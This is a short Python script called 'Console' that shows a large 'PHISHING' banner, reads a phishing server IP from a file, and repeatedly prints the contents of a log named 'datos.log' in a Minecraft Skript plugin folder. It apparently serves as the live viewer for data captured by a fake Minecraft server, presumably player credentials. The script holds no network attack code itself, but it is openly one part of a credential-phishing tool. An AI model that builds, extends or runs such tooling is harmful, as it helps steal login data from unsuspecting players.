##########
# Console
##########

import os
import re

from colorama import Fore, init
from time import sleep

init()

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

ip_file = open("ip_phishing.txt", "r")
ip = ip_file.read()
ip_file.close()

file = "plugins/Skript/logs/datos.log"

banner = f"""
\n\n{lred}    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████
    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒
    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
{white}    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓
    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒
    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ 
            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ \n\n"""

if os.name == "nt":
    os.system("title Console")

    
def console():
    print(banner)

    while True:
        sleep(3)

        if os.name == "nt":
            os.system("cls")
        
        else:
            os.system("clear")

        print(banner)
        print(f"{white}     [{lgreen}√{white}]{white} IP: {lred}{str(ip)}\n{lgreen}")

        if os.path.isfile(file):
            data_file = open(file, "r", encoding="unicode_escape")
            content = data_file.read()
            data_file.close()

            content = re.sub(r"\d\d/\d\d/\d\d \d\d:\d\d", "", content)
            print(content.replace("[]     [", "     ["))


if __name__ == "__main__":
    console()
